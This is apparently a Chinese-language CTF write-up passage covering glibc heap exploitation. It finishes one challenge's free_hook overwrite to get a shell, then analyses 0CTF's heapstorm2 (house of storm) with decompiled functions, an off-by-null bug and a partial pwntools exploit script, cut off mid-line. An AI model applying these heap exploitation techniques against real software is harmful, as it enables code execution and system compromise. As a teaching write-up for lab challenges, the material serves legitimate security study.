<p>再释放掉5号块（已修改为0x60大小），接着往它的FD写入刚刚伪造的0x60size的main_arena上的chunk，再申请2次即可往fake_chunk写入内容，也就是写入free_hook上方一些的topchunk地址，这样就实现了改heap下的topchunk的地址，下一次申请时就会从main_arena的topchunk地址处开始切割</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dele(<span class="number">0x5</span>)</span><br><span class="line">recovery  = <span class="string">''</span></span><br><span class="line">recovery += <span class="string">'3'</span>*<span class="number">0x30</span></span><br><span class="line">recovery += p64(<span class="number">0x61</span>)</span><br><span class="line">recovery += p64(LIBC+<span class="number">0x3c4b50</span>)</span><br><span class="line">edit(<span class="number">0x3</span>, recovery)</span><br><span class="line">add(<span class="number">0x40</span>,  <span class="string">'5'</span>*<span class="number">0x30</span> ) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x40</span>,  p64(LIBC+<span class="number">0x3c5c50</span>))</span><br></pre></td></tr></table></figure>

<p><img src="/blog_img/1571293007077.png" alt="57129300707"></p>
<p><img src="/blog_img/1571293059348.png" alt="57129305934"></p>
<p>现在修改后：</p>
<p><img src="/blog_img/1571293113498.png" alt="57129311349"></p>
<p>接下来一路申请就可以一步步靠近我们的free_hook了，申请到了free_hook的区域后，改写为system，再free一个有binsh的堆块既可实现getshell。</p>
<p>复原伪造的largebin的attack，并腾出空间：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0xb</span>, p64(HEAP+<span class="number">0x7e0</span>))</span><br><span class="line">dele(<span class="number">0x6</span>)</span><br></pre></td></tr></table></figure>

<p>最后是改free_hook</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'/bin/sh'</span>) <span class="comment">#</span></span><br><span class="line">dele(<span class="number">0x1</span>)</span><br><span class="line">add(<span class="number">0x300</span>, <span class="string">'\x00'</span>*<span class="number">0x1d0</span>+p64(LIBC+<span class="number">0x4526a</span>)) </span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/blog_img/1571293372421.png" alt="57129337242"></p>
<p><img src="/blog_img/1571293397230.png" alt="57129339723"></p>
<p>以上就是对于这题的一个解答，总结如下：</p>
<p>通过伪造largebin再申请出largebin进行溢出攻击，然后结合fastbin的attack，修改topchunk的地址，接着改free_hook为onegadget。</p>
<p>下一题：</p>
<h3 id="0CTF的一道house-0f-storm："><a href="#0CTF的一道house-0f-storm：" class="headerlink" title="0CTF的一道house 0f storm："></a>0CTF的一道house 0f storm：</h3><p>这道题质量很高</p>
<p>先查看保护机制：</p>
<p><img src="/blog_img/1571411564598.png" alt="57141156459"></p>
<p>保护全开，接着ida分析程序:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">initial</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  alarm(<span class="number">0x3C</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">    <span class="string">"    __ __ _____________   __   __    ___    ____\n"</span></span><br><span class="line">    <span class="string">"   / //_// ____/ ____/ | / /  / /   /   |  / __ )\n"</span></span><br><span class="line">    <span class="string">"  / ,&lt;  / __/ / __/ /  |/ /  / /   / /| | / __  |\n"</span></span><br><span class="line">    <span class="string">" / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /\n"</span></span><br><span class="line">    <span class="string">"/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/\n"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"===== HEAP STORM II ====="</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !mallopt(<span class="number">1</span>, <span class="number">0</span>) )<span class="comment">//将fastbin的max置为0，表示不存在fastbin了</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( mmap(<span class="number">0x13370000</span>, <span class="number">0x1000</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0L</span>L) != <span class="number">322371584</span> )<span class="comment">//申请了一块mmap的内存</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  fd = <span class="built_in">open</span>(<span class="string">"/dev/urandom"</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">read</span>(fd, <span class="number">0x13370800</span>, <span class="number">0x18</span>uLL) != <span class="number">0x18</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">close</span>(fd);</span><br><span class="line">  MEMORY[<span class="number">0x13370818</span>] = MEMORY[<span class="number">0x13370810</span>];<span class="comment">//0x13370800到0x13370820内容都是随机数</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(<span class="number">0x10</span> * (i + <span class="number">2L</span>L) + <span class="number">0x13370800</span>) = xorchunk(<span class="number">0x13370800</span>, <span class="number">0L</span>L);<span class="comment">//初始化0x13370820开始的内容为随机数</span></span><br><span class="line">    *(<span class="number">0x10</span> * (i + <span class="number">2L</span>L) + <span class="number">0x13370808</span>) = xorsize(<span class="number">0x13370800</span>LL, <span class="number">0L</span>L);<span class="comment">//初始化0x13370828开始的内容为随机数</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0x13370800</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过分析初始化函数，我们可以知道，程序申请了一个大堆块，用来存放我们申请的堆指针，其中在0x13370800到0x13370820内容都是随机数，然后我们堆块起始位置是0x13370820，size起始位置是0x13370828，初始化了随机数，依次往下，我们只有16个堆块可以操作，如图所示：</p>
<p><img src="/blog_img/1571412094930.png" alt="57141209493"></p>
<p><img src="/blog_img/1571412383212.png" alt="57141238321"></p>
<p>依然是4个功能，我们可以一个个看：</p>
<h4 id="1、calloc："><a href="#1、calloc：" class="headerlink" title="1、calloc："></a>1、calloc：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">Allocate</span><span class="params">(chunk *mmap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !xorsize(mmap, mmap[i + <span class="number">2</span>].<span class="built_in">size</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">      <span class="built_in">size</span> = get_long();</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">size</span> &gt; <span class="number">12</span> &amp;&amp; <span class="built_in">size</span> &lt;= <span class="number">4096</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ptr = <span class="built_in">calloc</span>(<span class="built_in">size</span>, <span class="number">1u</span>LL);</span><br><span class="line">        <span class="keyword">if</span> ( !ptr )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        mmap[i + <span class="number">2</span>].<span class="built_in">size</span> = xorsize(mmap, <span class="built_in">size</span>);<span class="comment">//堆地址和size都拿随机数进行了异或加密</span></span><br><span class="line">        mmap[i + <span class="number">2L</span>L].ptr = xorchunk(mmap, ptr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Chunk %d Allocated\n"</span>, i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Invalid Size"</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>知道了calloc，我们特地定义了结构体方便理解：</p>
<p><img src="/blog_img/1571412324904.png" alt="57141232490"></p>
<h4 id="2、update："><a href="#2、update：" class="headerlink" title="2、update："></a>2、update：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">Update</span><span class="params">(chunk *mmap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  chunk *v2; <span class="comment">// ST18_8</span></span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">size</span>; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  idx = get_long();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">15</span> || !xorsize(mmap, mmap[idx + <span class="number">2</span>].<span class="built_in">size</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid Index"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">  <span class="built_in">size</span> = get_long();</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">size</span> &lt;= <span class="number">0</span> || <span class="built_in">size</span> &gt; (xorsize(mmap, mmap[idx + <span class="number">2</span>].<span class="built_in">size</span>) - <span class="number">0xC</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid Size"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">  v2 = xorchunk(mmap, mmap[idx + <span class="number">2L</span>L].ptr);</span><br><span class="line">  read_n(v2, <span class="built_in">size</span>);</span><br><span class="line">  v3 = v2 + <span class="built_in">size</span>;</span><br><span class="line">  *v3 = 'ROTSPAEH';</span><br><span class="line">  *(v3 + 2) = 'II_M';</span><br><span class="line">  v3[<span class="number">12</span>] = <span class="number">0</span>;          <span class="comment">//0ffbynull</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Chunk %d Updated\n"</span>, idx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里很明显的漏洞，就是输入满了后，有个0ffbynull漏洞，但是每次输入完，都会在末尾加上12个字节才能触发0ffbynull</p>
<h4 id="3、Free"><a href="#3、Free" class="headerlink" title="3、Free"></a>3、Free</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">Delete</span><span class="params">(chunk *mmap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  idx = get_long();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">15</span> || !xorsize(mmap, mmap[idx + <span class="number">2</span>].<span class="built_in">size</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid Index"</span>);</span><br><span class="line">  ptr = xorchunk(mmap, mmap[idx + <span class="number">2L</span>L].ptr);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  mmap[idx + <span class="number">2L</span>L].ptr = xorchunk(mmap, <span class="number">0L</span>L);</span><br><span class="line">  mmap[idx + <span class="number">2</span>].<span class="built_in">size</span> = xorsize(mmap, <span class="number">0L</span>L);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Chunk %d Deleted\n"</span>, idx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里free完后又初始化为随机数，相当于清空了指针和size，没有漏洞</p>
<h4 id="4、View"><a href="#4、View" class="headerlink" title="4、View"></a>4、View</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">View</span><span class="params">(chunk *mmap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 <span class="built_in">size</span>; <span class="comment">// rbx</span></span><br><span class="line">  __int64 ptr; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> idx; <span class="comment">// [rsp+1Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (mmap[<span class="number">1</span>].<span class="built_in">size</span> ^ mmap[<span class="number">1</span>].ptr) != <span class="number">0x13377331</span> )<span class="comment">//都是随机数，所以异或后不可能是这个值</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Permission denied"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  idx = get_long();</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">15</span> || !xorsize(mmap, mmap[idx + <span class="number">2</span>].<span class="built_in">size</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid Index"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Chunk[%d]: "</span>, idx);</span><br><span class="line">  <span class="built_in">size</span> = xorsize(mmap, mmap[idx + <span class="number">2</span>].<span class="built_in">size</span>);</span><br><span class="line">  ptr = xorchunk(mmap, mmap[idx + <span class="number">2L</span>L].ptr);</span><br><span class="line">  write_n(ptr, <span class="built_in">size</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(byte_180A);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里明显是不能使用show函数，得改了才能使用这个函数进行泄露。</p>
<p>好了，程序分析完了，流程也清楚了，下面就是怎么利用offbynull去打题了，大概的思路如下：</p>
<p>1、利用offbynull，shrink the chunk（无法extend，因为presize被覆盖了字符，不能控制），造成对used态的堆块的修改</p>
<p>2、伪造largebin的bk_nextsize和bk指针，利用堆块插入时unlink，实现任意地址写堆地址，从而伪造出fake_chunk的size，fake_chunk肯定是mmap上面的地址啦</p>
<p>3、改写unsorted bin中堆块的bk指针，指向fake_chunk，就能看size申请出fake_chunk</p>
<p>4、申请出fake_chunk，就能改view函数的那个异或关卡，实现调用view函数泄露地址</p>
<p>5、通过改ptr位置为free_hook，然后update时就会改free_hook为onegadget，从而getshell</p>
<p>具体看exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./heapstorm2'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./heapstorm2'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'192.168.100.20'</span>,<span class="number">50001</span>)</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.18.so'</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    ru(<span class="string">"Command: "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"Size: "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Command: "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"Index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(index,size,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"Command: "</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">"Index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"Size: "</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">"Content: "</span>)</span><br><span class="line">    sl(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"Command: "</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"Index: "</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line">mmap_addr = <span class="number">0x13370800</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    malloc(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">    malloc(<span class="number">0x520</span>)<span class="comment">#1</span></span><br><span class="line">    malloc(<span class="number">0x18</span>)<span class="comment">#2</span></span><br><span class="line">    malloc(<span class="number">0x18</span>)<span class="comment">#3</span></span><br><span class="line">    malloc(<span class="number">0x520</span>)<span class="comment">#4</span></span><br><span class="line">    malloc(<span class="number">0x18</span>)<span class="comment">#5</span></span><br><span class="line">    malloc(<span class="number">0x18</span>)<span class="comment">#6</span></span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += <span class="string">'a'</span>*<span class="number">0x4f0</span></span><br><span class="line">    py += p64(<span class="number">0x500</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">    update(<span class="number">1</span>,len(py),py)</span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    update(<span class="number">0</span>,<span class="number">0x18</span><span class="number">-0xc</span>,(<span class="number">0x18</span><span class="number">-0xc</span>)*<span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">0x60</span>)</span><br><span class="line">    malloc(<span class="number">0x480</span>)<span class="comment">#7</span></span><br><span class="line">    <span class="comment"># debug(0)</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    malloc(<span class="number">0x540</span>)<span class="comment">#1</span></span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += <span class="string">'\x00'</span>*<span class="number">0x60</span></span><br><span class="line">    py += p64(<span class="number">0</span>) + p64(<span class="number">0x491</span>)</span><br><span class="line">    py += <span class="string">'\x00'</span>*<span class="number">0x480</span></span><br><span class="line">    py += p64(<span class="number">0x490</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">    update(<span class="number">1</span>,len(py),py)</span><br><span class="line">    <span class="comment">#fake_chunk1 #7</span></span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += <span class="string">'a'</span>*<span class="number">0x4f0</span></span><br><span class="line">    py += p64(<span class="number">0x500</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">    update(<span class="number">4</span>,len(py),py)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line">    update(<span class="number">3</span>,<span class="number">0x18</span><span class="number">-0xc</span>,(<span class="number">0x18</span><span 